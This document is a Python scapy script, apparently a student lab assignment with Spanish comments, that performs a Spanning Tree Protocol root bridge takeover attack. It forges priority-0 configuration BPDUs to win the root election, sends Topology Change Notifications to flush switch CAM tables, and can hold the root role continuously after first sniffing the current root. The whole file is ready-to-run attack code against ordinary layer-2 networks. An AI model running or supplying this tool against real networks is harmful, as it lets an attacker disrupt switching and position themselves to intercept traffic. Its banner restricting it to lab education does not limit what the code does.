#!/usr/bin/env python3
"""
STP Root Claim Attack - Matricula 2025-0719
"""
import os
import sys
import time
import signal
import struct
import random
import argparse

from scapy.all import Ether, LLC, sendp, sniff, conf, get_if_hwaddr

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

BANNER = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║       STP ROOT CLAIM ATTACK  -  Matricula: 2025-0719         ║
║        SOLO PARA USO EDUCATIVO EN LABORATORIO CONTROLADO     ║
╚══════════════════════════════════════════════════════════════╝
{RESET}"""

bpdus_sent = 0
tcns_sent  = 0
running    = True
start_time = None

STP_MULTICAST = "01:80:c2:00:00:00"


def signal_handler(sig, frame):
    global running
    running = False
    elapsed = time.time() - start_time if start_time else 0
    print(f"\n{GREEN}{'─'*50}")
    print(f"  RESUMEN STP ROOT ATTACK")
    print(f"{'─'*50}")
    print(f"  BPDUs enviados : {bpdus_sent:,}")
    print(f"  TCNs enviados  : {tcns_sent:,}")
    print(f"  Tiempo         : {elapsed:.1f}s")
    print(f"{'─'*50}{RESET}")
    sys.exit(0)


def mac_to_bytes(mac_str):
    return bytes.fromhex(mac_str.replace(":", ""))


def build_config_bpdu(iface, priority):
    """
    Construye BPDU de configuracion STP manualmente.
    priority=0 garantiza ganar la eleccion de Root Bridge.
    """
    my_mac     = get_if_hwaddr(iface)
    mac_bytes  = mac_to_bytes(my_mac)
    priority   = (priority // 4096) * 4096

    # Bridge ID = priority (2 bytes) + MAC (6 bytes)
    bridge_id  = struct.pack(">H", priority) + mac_bytes
    root_id    = struct.pack(">H", priority) + mac_bytes

    # STP Configuration BPDU payload
    stp_payload = struct.pack(
        ">HBBBBB",
        0x0000,   # Protocol ID
        0x00,     # Version (STP clasico)
        0x00,     # BPDU type (Configuration)
        0x01,     # Flags (TC bit)
        0x00, 0x00
    )
    stp_payload = (
        b'\x00\x00'    # Protocol ID
        b'\x00'        # Version
        b'\x00'        # BPDU Type: Configuration
        b'\x01'        # Flags: TC
        + root_id      # Root Bridge ID (8 bytes)
        + struct.pack(">I", 1)    # Root Path Cost = 1
        + bridge_id    # Bridge ID (8 bytes)
        + struct.pack(">H", 0x8001)  # Port ID
        + struct.pack(">H", 0x0000)  # Message Age
        + struct.pack(">H", 0x1400)  # Max Age = 20s
        + struct.pack(">H", 0x0200)  # Hello Time = 2s
        + struct.pack(">H", 0x0F00)  # Forward Delay = 15s
    )

    pkt = (
        Ether(src=my_mac, dst=STP_MULTICAST)
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        / stp_payload
    )
    return pkt


def build_tcn_bpdu(iface):
    """BPDU de Topology Change Notification — vacia tablas CAM"""
    my_mac = get_if_hwaddr(iface)
    tcn_payload = (
        b'\x00\x00'  # Protocol ID
        b'\x00'      # Version
        b'\x80'      # BPDU Type: TCN
    )
    pkt = (
        Ether(src=my_mac, dst=STP_MULTICAST)
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        / tcn_payload
    )
    return pkt


def scout_bpdus(iface):
    """Escucha BPDUs para conocer el Root Bridge actual"""
    print(f"\n{CYAN}[SCOUT] Escuchando BPDUs por 10 segundos...{RESET}")

    def show(pkt):
        if LLC in pkt and pkt[LLC].dsap == 0x42:
            raw = bytes(pkt[LLC].payload)
            if len(raw) >= 4 and raw[3] == 0x00:  # Config BPDU
                prio = struct.unpack(">H", raw[4:6])[0]
                mac  = ":".join(f"{b:02x}" for b in raw[6:12])
                print(f"  {GREEN}[BPDU]{RESET} Root Bridge actual: "
                      f"Priority={prio} MAC={mac}")

    sniff(iface=iface,
          filter="ether dst 01:80:c2:00:00:00",
          prn=show, count=5, timeout=10)


def run_attack(iface, priority, interval, send_tcn, continuous, scout):
    global bpdus_sent, tcns_sent, running, start_time

    conf.verb  = 0
    my_mac     = get_if_hwaddr(iface)
    start_time = time.time()

    print(f"{CYAN}[*] Interfaz   : {iface}{RESET}")
    print(f"{CYAN}[*] MAC        : {my_mac}{RESET}")
    print(f"{CYAN}[*] Prioridad  : {priority} (menor = mejor){RESET}")
    print(f"{CYAN}[*] Continuo   : {'Si' if continuous else 'No'}{RESET}")
    print(f"{CYAN}[*] Enviar TCN : {'Si' if send_tcn else 'No'}{RESET}")

    if scout:
        scout_bpdus(iface)

    print(f"\n{YELLOW}[*] Iniciando STP Root Attack... (Ctrl+C para detener){RESET}\n")

    config_bpdu = build_config_bpdu(iface, priority)

    # Rafaga inicial para ganar eleccion rapido
    print(f"{CYAN}[*] Enviando rafaga inicial de BPDUs...{RESET}")
    for _ in range(10):
        sendp(config_bpdu, iface=iface, verbose=False)
        bpdus_sent += 1
        time.sleep(0.1)
    print(f"{GREEN}[+] Rafaga completada: {bpdus_sent} BPDUs{RESET}")

    # TCN para vaciar tablas CAM
    if send_tcn:
        print(f"{CYAN}[*] Enviando TCN BPDUs...{RESET}")
        tcn_bpdu = build_tcn_bpdu(iface)
        for _ in range(5):
            sendp(tcn_bpdu, iface=iface, verbose=False)
            tcns_sent += 1
            time.sleep(0.2)
        print(f"{GREEN}[+] {tcns_sent} TCNs enviados — tablas CAM vaciadas{RESET}")

    # Modo continuo: mantenerse como Root Bridge
    if continuous:
        print(f"\n{GREEN}[+] Manteniendo Root Bridge (intervalo: {interval}s)...{RESET}")
        while running:
            config_bpdu = build_config_bpdu(iface, priority)
            sendp(config_bpdu, iface=iface, verbose=False)
            bpdus_sent += 1
            if send_tcn and bpdus_sent % 10 == 0:
                sendp(build_tcn_bpdu(iface), iface=iface, verbose=False)
                tcns_sent += 1
            print(f"{GREEN}[+]{RESET} BPDUs: {bpdus_sent} | "
                  f"TCNs: {tcns_sent} | "
                  f"Tiempo: {time.time()-start_time:.0f}s", end="\r")
            time.sleep(interval)
    else:
        print(f"\n{GREEN}[+] Ataque completado. Use --continuous para mantenerse.{RESET}")

    signal_handler(None, None)


def parse_args():
    parser = argparse.ArgumentParser(description="STP Root Attack - Matricula 2025-0719")
    parser.add_argument("-i", "--iface",    required=True,          help="Interfaz (ej: eth1)")
    parser.add_argument("-p", "--priority", type=int, default=0,    help="Prioridad STP (default: 0)")
    parser.add_argument("--interval",       type=float, default=2.0,help="Intervalo BPDUs (default: 2s)")
    parser.add_argument("--tcn",            action="store_true",    help="Enviar TCN BPDUs")
    parser.add_argument("--continuous",     action="store_true",    help="Mantener Root Bridge")
    parser.add_argument("--scout",          action="store_true",    help="Escuchar BPDUs primero")
    return parser.parse_args()


if __name__ == "__main__":
    print(BANNER)
    signal.signal(signal.SIGINT, signal_handler)

    if os.geteuid() != 0:
        print(f"{RED}[!] Requiere root: sudo python3 {sys.argv[0]}{RESET}")
        sys.exit(1)

    args = parse_args()
    run_attack(args.iface, args.priority, args.interval,
               args.tcn, args.continuous, args.scout)
